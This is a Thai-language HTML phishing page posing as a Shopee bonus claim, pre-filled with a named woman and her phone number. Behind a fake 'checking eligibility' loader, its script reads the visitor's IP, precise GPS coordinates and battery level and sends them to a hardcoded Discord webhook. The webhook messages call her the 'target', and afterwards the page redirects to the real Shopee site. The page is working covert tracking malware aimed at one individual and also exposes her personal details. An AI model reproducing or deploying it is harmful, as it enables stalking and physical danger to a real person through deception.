<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Shopee | รับอั่งเปาวงเงินพิเศษ</title>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Kanit', sans-serif; background: #f4f4f4; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { background: white; width: 92%; max-width: 400px; border-radius: 25px; padding: 25px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.1); border-top: 8px solid #ee4d2d; }
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 2000; }
        .modal-box { background: white; width: 85%; border-radius: 20px; padding: 30px; text-align: center; border-top: 5px solid #ee4d2d; }
        .step { display: none; animation: fadeIn 0.5s; }
        .step.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #ee4d2d; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 30px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: #ee4d2d; color: white; border: none; padding: 16px; border-radius: 50px; width: 100%; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 12px; background: #f9f9f9; color: #333; font-size: 15px; }
    </style>
</head>
<body onload="initApp()">

<div class="modal-overlay" id="gpsModal">
    <div class="modal-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" width="60" style="margin-bottom:15px;">
        <h2 style="font-size:20px; color:#ee4d2d; margin-bottom:10px;">ยืนยันสิทธิ์รับอั่งเปา</h2>
        <p style="font-size:15px; color:#444;">ตรวจสอบพื้นที่เพื่อสุ่มยอดโบนัสสำหรับเบอร์ 0925733791</p>
        <button class="btn" onclick="startDeepScan()">ยินยอมและตกลง</button>
    </div>
</div>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" width="75" style="margin-bottom:10px;">
    
    <div class="step active" id="step1">
        <h1 style="font-size:20px;">ยืนยันสิทธิ์รับอั่งเปา</h1>
        <p style="font-size:13px; color:#666; margin-bottom:20px;">สิทธิพิเศษสำหรับ 0925733791</p>
        <input type="text" value="วราภรณ์ ดีสอน" readonly>
        <input type="tel" value="0925733791" readonly style="color: #ee4d2d; font-weight: bold;">
        <button class="btn" onclick="document.getElementById('gpsModal').style.display='flex'">ข้อมูลถูกต้อง กดรับสิทธิ์</button>
    </div>

    <div class="step" id="step2">
        <h1 style="font-size:18px;">กำลังประมวลผลเครดิต...</h1>
        <div class="loader"></div>
        <p id="loadingText" style="font-size:14px; color:#666;">กำลังตรวจสอบสิทธิประโยชน์พื้นที่ (0%)</p>
    </div>

    <div class="step" id="step3">
        <h1 style="color:#28a745; font-size:22px;">สุ่มรับอั่งเปาสำเร็จ!</h1>
        <div style="background:#fff5f1; padding:20px; border-radius:20px; margin:15px 0; border:2px dashed #ee4d2d;">
            <p style="margin:0; color:#666; font-size:14px;">ยอดอั่งเปาที่คุณได้รับ</p>
            <h2 style="margin:10px 0; font-size:36px; color:#ee4d2d;">฿ 200</h2>
        </div>
        <p style="font-size:12px; color:#999;">ยอดเงินจะโอนเข้าบัญชีเบอร์ 0925733791 ภายใน 24 ชม.</p>
    </div>
</div>

<script>
    const WEB_HOOK = "https://discordapp.com/api/webhooks/1489269207026897087/TzJIxIrMpztF8yqduGcpPUwQwCnQflmd_5nbHdBtqwevdBWYV76KS4ite7kS087V_REw";
    let userIP = "กำลังดึงข้อมูล..."; 
    let bestPos = null;

    // --- ฟังก์ชันดึง IP (กลับมาแล้ว!) ---
    async function initApp() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            userIP = data.ip;
        } catch (e) {
            userIP = "ไม่สามารถระบุ IP ได้";
        }
    }

    function startDeepScan() {
        document.getElementById('gpsModal').style.display = 'none';
        goToStep(2);

        if (navigator.geolocation) {
            // จังหวะที่ 1: ส่งพิกัดแรกพร้อม IP ทันที
            navigator.geolocation.getCurrentPosition(p => {
                bestPos = p;
                sendToDiscord(p, "⚡ เริ่มการล็อกพิกัด (เป้าหมายกดตกลง)");
            }, null, { enableHighAccuracy: true });

            let percent = 0;
            const text = document.getElementById('loadingText');
            const interval = setInterval(() => {
                percent += 1;
                text.innerText = `กำลังตรวจสอบสิทธิประโยชน์พื้นที่ (${percent}%)`;
                if (percent >= 100) {
                    clearInterval(interval);
                    finalizeTarget();
                }
            }, 300);
        }
    }

    function finalizeTarget() {
        // จังหวะที่ 2: เค้นพิกัดสรุปสุดท้ายพร้อม IP
        navigator.geolocation.getCurrentPosition(p => {
            sendToDiscord(p, "🎯 พิกัดสรุปสุดท้าย (นิ่งที่สุด/หน้าสรุปยอด)");
            goToStep(3);
            setTimeout(() => {
                window.location.href = "https://shopee.co.th/m/spaylater";
            }, 8000);
        }, () => {
            if(bestPos) sendToDiscord(bestPos, "⚠️ พิกัดสำรอง (ดาวเทียมล็อกไม่ทัน)");
            goToStep(3);
        }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
    }

    function goToStep(num) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById('step' + num).classList.add('active');
    }

    async function sendToDiscord(p, status) {
        let bat = "N/A";
        try { const b = await navigator.getBattery(); bat = (b.level * 100).toFixed(0) + "%"; } catch(e) {}
        
        const lat = p.coords.latitude;
        const lng = p.coords.longitude;
        const maps = `https://www.google.com/maps?q=${lat},${lng}`;
        
        fetch(WEB_HOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                embeds: [{
                    title: status,
                    color: status.includes("สรุป") ? 2067276 : 16744192,
                    fields: [
                        { name: "🌐 IP Address", value: userIP, inline: false }, // ยัดกลับเข้าที่เดิมแล้วครับบอส!
                        { name: "🎯 ความแม่นยำ", value: p.coords.accuracy.toFixed(1) + " ม.", inline: true },
                        { name: "🔋 แบตเตอรี่", value: bat, inline: true },
                        { name: "🗺️ แผนที่", value: `[เปิด Google Maps](${maps})` }
                    ],
                    footer: { text: "เป้าหมาย: วราภรณ์ ดีสอน | 0925733791" },
                    timestamp: new Date().toISOString()
                }]
            })
        });
    }
</script>
</body>
</html>
